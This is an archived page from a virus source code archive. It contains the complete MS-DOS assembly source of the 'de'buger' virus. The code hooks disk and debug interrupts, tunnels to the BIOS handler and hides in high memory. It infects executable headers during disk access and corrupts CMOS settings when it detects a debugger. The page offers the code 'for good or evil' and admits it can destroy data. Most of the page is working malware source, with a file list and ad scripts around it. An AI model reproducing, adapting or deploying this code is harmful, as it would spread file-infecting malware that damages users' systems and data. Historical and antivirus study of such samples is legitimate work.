<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: de'buger_asm</title>
<meta name="KEYWORDS" content="de'buger.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for de'buger.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="da_1800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_1800_asm.php">da_1800_asm</a><br>
<a href="da_2000d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2000d_asm.php">da_2000d_asm</a><br>
<a href="da_2100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_2100_asm.php">da_2100_asm</a><br>
<a href="da'boys__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys__asm.php">da'boys__asm</a><br>
<a href="da'boys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da'boys_asm.php">da'boys_asm</a><br>
<a href="daddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daddy_asm.php">daddy_asm</a><br>
<a href="daemaen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/daemaen_asm.php">daemaen_asm</a><br>
<a href="dame_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dame_asm.php">dame_asm</a><br>
<a href="dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dan_asm.php">dan_asm</a><br>
<a href="danger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/danger_asm.php">danger_asm</a><br>
<a href="da_olivr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/da_olivr_asm.php">da_olivr_asm</a><br>
<a href="dapm2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dapm2_asm.php">dapm2_asm</a><br>
<a href="dark2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark2_asm.php">dark2_asm</a><br>
<a href="dark3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark3_asm.php">dark3_asm</a><br>
<a href="darkapoc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkapoc_asm.php">darkapoc_asm</a><br>
<a href="dark__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark__asm.php">dark__asm</a><br>
<a href="dark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dark_asm.php">dark_asm</a><br>
<a href="darkaven_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkaven_asm.php">darkaven_asm</a><br>
<a href="darkstar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darkstar_asm.php">darkstar_asm</a><br>
<a href="darlene_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darlene_asm.php">darlene_asm</a><br>
<a href="darth1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth1_asm.php">darth1_asm</a><br>
<a href="darth2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth2_asm.php">darth2_asm</a><br>
<a href="darth3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth3_asm.php">darth3_asm</a><br>
<a href="darth4___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4___asm.php">darth4___asm</a><br>
<a href="darth4__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4__asm.php">darth4__asm</a><br>
<a href="darth4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth4_asm.php">darth4_asm</a><br>
<a href="darth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/darth_asm.php">darth_asm</a><br>
<a href="das_boot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/das_boot_asm.php">das_boot_asm</a><br>
<a href="datacrim_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datacrim_asm.php">datacrim_asm</a><br>
<a href="datalock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datalock_asm.php">datalock_asm</a><br>
<a href="datarape_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarape_asm.php">datarape_asm</a><br>
<a href="datarp23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/datarp23_asm.php">datarp23_asm</a><br>
<a href="dav1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav1_asm.php">dav1_asm</a><br>
<a href="dav_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dav_b_asm.php">dav_b_asm</a><br>
<a href="dbase_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dbase_asm.php">dbase_asm</a><br>
<a href="dc-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dc-b_asm.php">dc-b_asm</a><br>
<a href="dcii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dcii_asm.php">dcii_asm</a><br>
<a href="death_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/death_asm.php">death_asm</a><br>
<a href="de'buger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/de'buger_asm.php">de'buger_asm</a><br>
<a href="decode__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode__asm.php">decode__asm</a><br>
<a href="decode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decode_asm.php">decode_asm</a><br>
<a href="decom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/decom_asm.php">decom_asm</a><br>
<a href="define___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define___asm.php">define___asm</a><br>
<a href="define__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define__asm.php">define__asm</a><br>
<a href="define_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/define_asm.php">define_asm</a><br>
<a href="defs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/defs_asm.php">defs_asm</a><br>
<a href="dei_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dei_asm.php">dei_asm</a><br>
<a href="deicide__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide__asm.php">deicide__asm</a><br>
<a href="deicide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deicide_asm.php">deicide_asm</a><br>
<a href="deldir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/deldir_asm.php">deldir_asm</a><br>
<a href="demo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demo_asm.php">demo_asm</a><br>
<a href="demoexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demoexe_asm.php">demoexe_asm</a><br>
<a href="demon__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon__asm.php">demon__asm</a><br>
<a href="demon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demon_asm.php">demon_asm</a><br>
<a href="demov1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov1_asm.php">demov1_asm</a><br>
<a href="demov2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov2_asm.php">demov2_asm</a><br>
<a href="demov3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov3_asm.php">demov3_asm</a><br>
<a href="demov4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov4_asm.php">demov4_asm</a><br>
<a href="demov5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demov5_asm.php">demov5_asm</a><br>
<a href="demovir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/demovir_asm.php">demovir_asm</a><br>
<a href="destruct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/destruct_asm.php">destruct_asm</a><br>
<a href="detect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/detect_asm.php">detect_asm</a><br>
<a href="devdance_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/devdance_asm.php">devdance_asm</a><br>
<a href="dhog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dhog_asm.php">dhog_asm</a><br>
<a href="diamond__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond__asm.php">diamond__asm</a><br>
<a href="diamond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diamond_asm.php">diamond_asm</a><br>
<a href="diarrhe4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe4_asm.php">diarrhe4_asm</a><br>
<a href="diarrhe6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diarrhe6_asm.php">diarrhe6_asm</a><br>
<a href="dieloser_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dieloser_pas.php">dieloser_pas</a><br>
<a href="digdeath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digdeath_asm.php">digdeath_asm</a><br>
<a href="digipol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/digipol_asm.php">digipol_asm</a><br>
<a href="dikotomy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dikotomy_asm.php">dikotomy_asm</a><br>
<a href="diogenes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diogenes_asm.php">diogenes_asm</a><br>
<a href="dir-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-2_asm.php">dir-2_asm</a><br>
<a href="dir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir2_asm.php">dir2_asm</a><br>
<a href="dir_2d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_2d_asm.php">dir_2d_asm</a><br>
<a href="dir_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_ii_asm.php">dir_ii_asm</a><br>
<a href="dir-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-ii_asm.php">dir-ii_asm</a><br>
<a href="dirii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dirii_asm.php">dirii_asm</a><br>
<a href="dir_iii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir_iii_asm.php">dir_iii_asm</a><br>
<a href="dir-vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dir-vir_asm.php">dir-vir_asm</a><br>
<a href="diskkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/diskkill_asm.php">diskkill_asm</a><br>
<a href="dissolve_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dissolve_asm.php">dissolve_asm</a><br>
<a href="dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dj_asm.php">dj_asm</a><br>
<a href="dkennedy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dkennedy_asm.php">dkennedy_asm</a><br>
<a href="donothin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/donothin_asm.php">donothin_asm</a><br>
<a href="dontell__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontell__asm.php">dontell__asm</a><br>
<a href="dontello_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dontello_asm.php">dontello_asm</a><br>
<a href="doodle_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doodle_asm.php">doodle_asm</a><br>
<a href="doom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doom_asm.php">doom_asm</a><br>
<a href="doomsday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doomsday_asm.php">doomsday_asm</a><br>
<a href="dos_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos_1_asm.php">dos_1_asm</a><br>
<a href="dos-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos-1_asm.php">dos-1_asm</a><br>
<a href="dos1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dos1_asm.php">dos1_asm</a><br>
<a href="doteater_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/doteater_asm.php">doteater_asm</a><br>
<a href="dotkill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dotkill_asm.php">dotkill_asm</a><br>
<a href="dr20-inf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dr20-inf_asm.php">dr20-inf_asm</a><br>
<a href="dreamer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamer_asm.php">dreamer_asm</a><br>
<a href="dreamwrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dreamwrl_asm.php">dreamwrl_asm</a><br>
<a href="droper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/droper_asm.php">droper_asm</a><br>
<a href="drop_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drop_rep_asm.php">drop_rep_asm</a><br>
<a href="dropsy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dropsy_asm.php">dropsy_asm</a><br>
<a href="drq-1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1028_asm.php">drq-1028_asm</a><br>
<a href="drq_1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq_1161_asm.php">drq_1161_asm</a><br>
<a href="drq-1161_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/drq-1161_asm.php">drq-1161_asm</a><br>
<a href="druid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/druid_asm.php">druid_asm</a><br>
<a href="dsce-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsce-gen_asm.php">dsce-gen_asm</a><br>
<a href="dsmedemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsmedemo_asm.php">dsmedemo_asm</a><br>
<a href="dsme-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dsme-gen_asm.php">dsme-gen_asm</a><br>
<a href="dt_251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_251_asm.php">dt_251_asm</a><br>
<a href="dt-251_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-251_asm.php">dt-251_asm</a><br>
<a href="dt_310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_310_asm.php">dt_310_asm</a><br>
<a href="dt-310_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt-310_asm.php">dt-310_asm</a><br>
<a href="dtiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dtiny_asm.php">dtiny_asm</a><br>
<a href="dt_kendy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/dt_kendy_asm.php">dt_kendy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

cseg            segment para    public  'code'
de_buger        proc    near
assume          cs:cseg


.186


ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
CMOS_CRC_ERROR  equ     02eh
CMOS_PORT       equ     070h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
DEBUGER_CODE_AT equ     00155h
DENY_NONE       equ     040h
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_GET_INT     equ     03500h
DOS_SET_INT     equ     02500h
EIGHTEEN_BYTES  equ     012h
ENVIRONMENT     equ     02ah
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAR_INDEX_CALL  equ     01effh
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FIVE_BYTES      equ     005h
FORMAT_TRACK    equ     00500h
FOUR_BITS       equ     004h
FOUR_BYTES      equ     004h
GET_ERROR_LEVEL equ     04d00h
GET_STATUS      equ     00100h
HIGH_BYTE       equ     00100h
HMA_SEGMENT     equ     0ffffh
INT_1_VECTOR    equ     00004h
INT_13_VECTOR   equ     0004ch
INVALID_OPCODE  equ     006h
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
MAX_SECTORS     equ     070h
MULTIPLEX_INT   equ     02fh
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
NULL            equ     0000h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
PARAMETER_TABLE equ     001f1h
PARENT_OWNER    equ     00003h
PARENT_PSP      equ     00016h
READ_A_SECTOR   equ     00201h
READ_W_HANDLE   equ     03f00h
RESIZE_MEMORY   equ     04a00h
ROM_SEGMENT     equ     0f000h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SINGLE_STEP     equ     00100h
SINGLE_STEP_INT equ     001h
SIX_BYTES       equ     006h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_HEX      equ     020h
TWENTY_THREE    equ     017h
TWO_BYTES       equ     002h
VERIFY_A_SECTOR equ     00401h
WRITE_A_SECTOR  equ     00301h
WRITE_COMMAND   equ     060h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE


bios_seg        segment at 0f000h
		org     00000h                  
old_int_13_addr LABEL   BYTE                    
bios_seg        ends


		org     COM_OFFSET              
com_code:

		jmp     short code_start


dummy_exe_head  dw      SIX_BYTES,TWO_BYTES,NULL,TWENTY_HEX,ONE_BYTE,HMA_SEGMENT
		dw      NULL,NULL,NULL,NULL,NULL,TWENTY_HEX


		org     DEBUGER_CODE_AT


debugged        proc    near
		db      08ah                            ;make next line mov ah,bh
blow_cmos:      out     CMOS_PORT,ax
		popa
		popf
		jmp     short end_it
debugged        endp


		org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET


code_start      proc    near      
		mov     dx,offset next_part
		mov     ax,DOS_GET_INT+INVALID_OPCODE
		int     DOS_INT
		mov     ah,high(DOS_SET_INT)
		int     DOS_INT
		db      08dh,0d3h                       ;lea dx,bx (invalid op)
end_it:         push    es
		pop     ds
re_end_it:      int     DOS_INT                 
		mov     ah,high(TERMINATE_W_ERR)
		int     DOS_INT
code_start      endp


next_part       proc    near
		pop     dx
		pop     dx
		mov     dx,bx
		pusha
		push    ds
		mov     di,THREE_BYTES
		mov     bp,word ptr ds:[di+PARENT_PSP-THREE_BYTES]
		push    es
		pop     ds
		int     21h
		dec     bp
		mov     ds,bp
		inc     bp
		mov     si,word ptr ds:[di+PARENT_OWNER-THREE_BYTES]
		xor     bx,bx
		mov     ds,bx
		mov     ax,word ptr ds:[di+INT_1_VECTOR-THREE_BYTES]
		shr     ax,FOUR_BITS
		inc     ax
		add     ax,word ptr ds:[di+INT_1_VECTOR+TWO_BYTES-THREE_BYTES]
		sub     ax,bp
		jc      no_debug
		cmp     si,ax
no_debug:       pop     ds
		mov     al,CMOS_CRC_ERROR
		jnc     blow_cmos
next_part       endp


alloc_memory    proc    near                    
		les     di,dword ptr ds:[bx+di+ENVIRONMENT-THREE_BYTES]
		mov     ax,ALLOCATE_HMA         
		mov     bh,high(SECTOR_SIZE*3)
		push    es                      
		int     MULTIPLEX_INT           
		call    ax_cx_si_cld            
		mov     ah,high(VERIFY_A_SECTOR)
		xchg    bl,bh
		inc     di                      
		jz      find_name
alloc_memory    endp                            


move_to_hma     proc    near                
		rep     movsb 
move_to_hma     endp


set_int_13      proc    near                    
		mov     si,offset interrupt_one
		xchg    di,cx
		mov     ds,di
		xchg    word ptr ds:[bx-TWO_BYTES],si
		push    si                      
		push    word ptr ds:[bx]     
		mov     word ptr ds:[bx],cs  
		pushf                           
		int     SINGLE_STEP_INT         
push_then_call: pushf                           
		call    dword ptr ds:INT_13_VECTOR
		popf                            
		pop     word ptr ds:[bx]     
		pop     word ptr ds:[bx-TWO_BYTES]
set_int_13      endp                            


find_name       proc    near                    
		pop     ds                      
look_for_nulls: inc     bx                      
		xor     word ptr ds:[bx-FOUR_BYTES],di
		jnz     look_for_nulls          
find_name       endp                            


open_file       proc    near                    
		mov     ah,high(FLUSH_BUFFERS)
		int     DOS_INT                 
		xchg    ax,cx
		mov     bp,READ_W_HANDLE+DENY_NONE+ONLY_READ
		xchg    bx,dx
re_convert:     mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
		push    ds
		push    dx                      
		int     DOS_INT
		push    ax                      
		push    cs
		mov     bx,JOB_FILE_TABLE
		pop     ds
		xchg    ax,bx
		int     MULTIPLEX_INT           
		mov     dx,SYS_FILE_TABLE
		mov     bl,byte ptr es:[di]
		db      08bh,0c2h                       ;mov ax,dx (direction bit set)
		int     MULTIPLEX_INT           
		mov     ax,WRITE_W_HANDLE+DENY_NONE+ONLY_WRITE
		xchg    ax,bp
		cmpsw                           
		mov     ch,high(SECTOR_SIZE)
		stosb                          
		pop     bx                      
		int     DOS_INT                 
		mov     ah,high(CLOSE_HANDLE)
		or      byte ptr es:[di+DONT_SET_OFFSET-THREE_BYTES],DONT_SET_TIME
		int     DOS_INT
		push    cs                      
		db      08bh,0dah                       ;mov bx,dx (direction bit set)
		pop     es                      
		call    convert_back            
		pop     dx                      
		pop     ds
		jne     now_run_it              
		repnz   stosb                   
		jmp     short re_convert
open_file       endp


convert_back    proc    near                    
		call    ax_cx_di_si_cld         
		repe    cmps byte ptr cs:[si],es:[di]
		jne     not_de_buger                
		xor     byte ptr ds:[bx],ah
convert_back    endp                    


ax_cx_di_si_cld proc    near                    
		lea     di,word ptr ds:[bx+DEBUGER_CODE_AT-COM_OFFSET]
ax_cx_si_cld:   call    set_si                  
set_si:         cld                             
		mov     cx,offset goto_dos-offset debugged
		pop     ax                      
		sub     ax,set_si-debugged
		db      033h,0f6h                       ;xor si,si (direction bit set)
		xchg    ax,si
		mov     ah,high(XOR_CODE)       
not_de_buger:   ret
ax_cx_di_si_cld endp


now_run_it      proc    near                    
		mov     si,SYS_FILE_TABLE+PARAMETER_TABLE
		mov     bx,offset exec_table
		mov     ah,high(RESIZE_MEMORY)
		int     DOS_INT                 
		db      08bh,0feh                       ;mov di,si (direction bit set)
		mov     ax,EXEC_PROGRAM         
		xchg    si,bx                   
set_table:      scasw                           
		movs    byte ptr es:[di],cs:[si]
		scasb                           
		mov     word ptr es:[di],es     
		je      set_table               
		int     DOS_INT                 
		mov     ah,high(GET_ERROR_LEVEL)
		jmp     re_end_it
now_run_it      endp                            


convert_to      proc    near                    
		pusha                           
		clc                             
		mov     ax,EXE_SIGNATURE        
		pushf                           
		xor     ax,word ptr ds:[bx]     
		jnz     not_exe_header          
		cmp     word ptr ds:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
		jae     not_exe_header          
		cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],SETVER_SIZE          
		je      not_exe_header          
		cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],MAX_SECTORS          
		jae     not_exe_header          
		call    ax_cx_di_si_cld         
		pusha                           
		repe    scasb                   
		popa                            
		jne     not_exe_header          
		xor     byte ptr ds:[bx],ah
		rep     movs byte ptr es:[di],cs:[si]
		popf                            
		stc                             
		pushf                           
not_exe_header: popf                            
		popa                            
		ret                             
convert_to      endp


interrupt_13    proc    far                     
compare_status: cmp     ah,high(GET_STATUS)
		jbe     call_old_int_13         
		push    ds                      
		push    es                      
		pop     ds
		call    convert_to              
		pushf                           
		push    cs                      
		call    call_old_int_13         
		pushf                           
		pusha                           
		mov     ax,WRITE_A_SECTOR
		call    convert_to              
		jnc     do_convertback          
		pushf                           
		push    cs                      
		call    call_old_int_13         
do_convertback: call    convert_back            
		jne     no_need                
		repnz   stosb                   
no_need:        popa                            
		popf                            
		pop     ds
		retf    KEEP_CF_INTACT          
interrupt_13    endp


interrupt_one   proc    far                     
		cmp     ah,high(VERIFY_A_SECTOR)
		jne     interrupt_ret           
		pusha
		push    ds
		db      08bh,0ech                       ;mov bp,sp (direction bit set)
		lds     si,dword ptr ss:[bp+EIGHTEEN_BYTES]
		cmp     word ptr ds:[si+ONE_BYTE],FAR_INDEX_CALL
		jne     go_back                 
		cmp     si,offset push_then_call
		mov     si,word ptr ds:[si+THREE_BYTES]
		je      toggle_tf               
		cmp     byte ptr ds:[si+THREE_BYTES],(high(ROM_SEGMENT))-ONE_BYTE
		jbe     go_back                 
		xchg    di,cx                   
		cld                             
		movsw                           
		std                             
		movsw                           
		db      02bh,0fbh                       ;sub di,bx (direction bit set)
		mov     word ptr ds:[si+TWO_BYTES+bx-SIX_BYTES],es
		mov     word ptr ds:[si],di     
toggle_tf:      xor     byte ptr ss:[bp+TWENTY_THREE],high(SINGLE_STEP)
go_back:        pop     ds
		popa
interrupt_ret:  iret                            
interrupt_one   endp                            


		db      '(Q)'


exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB


		org     COM_OFFSET+SECTOR_SIZE-SIX_BYTES


int_13_entry    proc    near
		cmp     ah,high(FORMAT_TRACK)  
		jb      compare_status          
int_13_entry    endp


		org     COM_OFFSET+SECTOR_SIZE-ONE_BYTE


call_old_int_13 proc    near                    
		jmp     far ptr old_int_13_addr
call_old_int_13 endp


		org     COM_OFFSET+SECTOR_SIZE


goto_dos        proc    near                    
		mov     ax,TERMINATE_W_ERR
		int     DOS_INT                 
goto_dos        endp



de_buger        endp                            
cseg            ends
end             com_code



</textarea></td></tr></table></body></html>
